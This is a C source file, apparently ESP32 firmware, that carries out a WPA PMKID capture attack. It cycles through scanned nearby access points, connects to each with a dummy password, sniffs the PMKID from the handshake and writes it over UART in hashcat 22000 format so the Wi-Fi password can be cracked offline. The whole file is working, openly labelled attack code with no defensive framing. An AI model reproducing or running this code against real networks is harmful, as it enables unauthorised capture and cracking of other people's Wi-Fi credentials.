#include "attack_pmkid.h"

TaskHandle_t pmkid_handle = NULL;

bool attack_state = 0;

wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE] = {};
uint16_t ap_count = 0;
int last_scanned_target = 0;

uint16_t pmkid_scan_time_sec = 2;

static void pmkid_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    vTaskSuspend(pmkid_handle);
    attack_pmkid_stop();

    key_data_t *key_data = (key_data_t *)event_data;
    uint8_t *pmkid = key_data->pmkid;
    uint8_t mac_client[6] = {};
    wifi_get_sta_mac(mac_client);
    char *ch22000_pmkid;
    ch22000_pmkid = pmkid_to_hc22000(
        pmkid, 
        (uint8_t *)(ap_info + last_scanned_target)->bssid, 
        mac_client, 
        (uint8_t *)(ap_info + last_scanned_target)->ssid,
        strlen((char *)(ap_info + last_scanned_target)->ssid)
    );
    UART_write(ch22000_pmkid, hc22000_size_get());
    UART_write("\n", 1);
    printf("GOT_PMKID\n");

    vTaskResume(pmkid_handle);
}

void pmkid_active_scan_task(void *arg) {

    int scanned_target = 0;

    while(1) {
        vTaskDelay(50 / portTICK_PERIOD_MS);
        if (scanned_target == ap_count) {
            scanned_target = 0;
            attack_pmkid_stop();
            wifi_scan(ap_info, &ap_count);
        }
        last_scanned_target = scanned_target;
        if (attack_state) {
            wifictl_sniffer_set_channel((ap_info + scanned_target)->primary);
            frame_analyzer_change_bssid_filter((ap_info + scanned_target)->bssid);
        } else {
            attack_pmkid_start(ap_info + scanned_target);
        }
        wifi_sta_connect_to_ap(ap_info + scanned_target, "dummypassword");

        UART_write((ap_info + last_scanned_target)->ssid, strlen((char *)(ap_info + last_scanned_target)->ssid));
        UART_write("\n", 1);

        vTaskDelay(pmkid_scan_time_sec*1000 / portTICK_PERIOD_MS);

        wifi_sta_disconnect();

        scanned_target++;
    }

    if (pmkid_handle != NULL) {
        vTaskDelete(pmkid_handle);
    }

}

void attack_pmkid_start(wifi_ap_record_t * ap_record) {
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_set_channel(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_handler, NULL));
    attack_state = 1;
}

void attack_pmkid_stop() {
    if (attack_state == 0) return;
    attack_state = 0;
    wifi_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_handler));
}

void pmkid_scan_start() {
    xTaskCreate(pmkid_active_scan_task, "at_handler_task", 1024*2, NULL, configMAX_PRIORITIES - 1, &pmkid_handle);
}

void pmkid_scan_stop() {
    if (pmkid_handle != NULL) {
        vTaskDelete(pmkid_handle);
    }
    attack_pmkid_stop();
}